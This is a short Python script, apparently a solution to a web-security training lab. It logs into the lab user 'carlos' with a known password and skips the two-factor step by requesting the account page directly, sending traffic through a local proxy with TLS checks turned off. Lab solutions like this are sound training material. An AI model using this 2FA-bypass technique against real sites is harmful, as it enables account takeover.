import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http':'http://127.0.0.1:8080','https':'http://127.0.0.1:8080'}


def access_carlos_account(s,url):
    
    # login in to carlos account
    print("(+) Login into carlo's account and bypassing 2fa verification...")
    login_url = url + '/login'
    login_data = {'username':"carlos",'password':'montoya'}
    re = s.post(login_url,data=login_data,allow_redirects=False,verify=False,proxies=proxies)

    #confirm bypass
    myaccount = url + '/my-account'
    r = s.get(myaccount, verify=False, proxies=proxies)
    if "Log out" in r.text:
        print("(+) Successfully bypassed 2FA verification.")
    else:
        print("(-) Exploit failed.")
        sys.exit(-1)

def mian():
    if len(sys.argv) != 2:
        print("(+) Usages: %s <url>" %sys.argv[0])
        print("(+) Example: %s www.example.com" %sys.argv[0])
        sys.exit(-1)

    url = sys.argv[1]
    s = requests.session()
    access_carlos_account(s,url)

if __name__ == "__main__":
    mian()